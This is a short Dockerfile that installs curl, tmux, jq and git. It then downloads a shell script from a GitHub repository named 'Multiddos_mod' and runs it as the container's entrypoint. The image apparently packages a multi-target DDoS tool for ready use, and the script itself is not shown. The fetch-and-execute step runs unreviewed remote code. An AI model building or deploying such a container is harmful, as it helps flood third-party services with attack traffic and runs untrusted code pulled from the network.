FROM python:3.10-slim as builder

RUN apt-get update && apt-get -y install --no-install-recommends gcc python3-dev
RUN python3 -m venv /opt/venv
ENV PATH="/opt/venv/bin:$PATH"

RUN apt-get update 
RUN apt-get -y install curl
RUN apt-get -y install tmux
RUN apt-get -y install toilet
RUN apt-get -y install jq
RUN apt-get -y install git

ENV TERM xterm

RUN tmux show -g | cat > ~/.tmux.conf

WORKDIR /home/root

RUN curl -LO https://raw.githubusercontent.com/LordWarWar/Multiddos_mod/main/md2_mod_2.sh
RUN chmod +x ./md2_mod_2.sh

ENTRYPOINT ["bash","./md2_mod_2.sh"]
